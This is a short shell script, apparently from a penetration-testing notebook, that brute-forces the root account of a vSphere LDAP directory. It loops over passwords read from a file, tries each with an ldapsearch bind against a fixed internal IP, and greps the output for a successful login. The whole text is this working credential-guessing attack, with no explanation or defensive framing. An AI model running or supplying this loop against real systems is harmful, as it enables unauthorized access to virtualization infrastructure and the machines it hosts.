target=172.28.48.27
account=root
for i in $(cat pass.txt); do echo -e "\n$i"; ldapsearch -x -H ldap://$target -D "CN=$account,CN=Users,DC=vsphere,DC=local" -w $i -b "DC=vsphere,DC=local" | grep "# numEntries"; done
unset target
unset account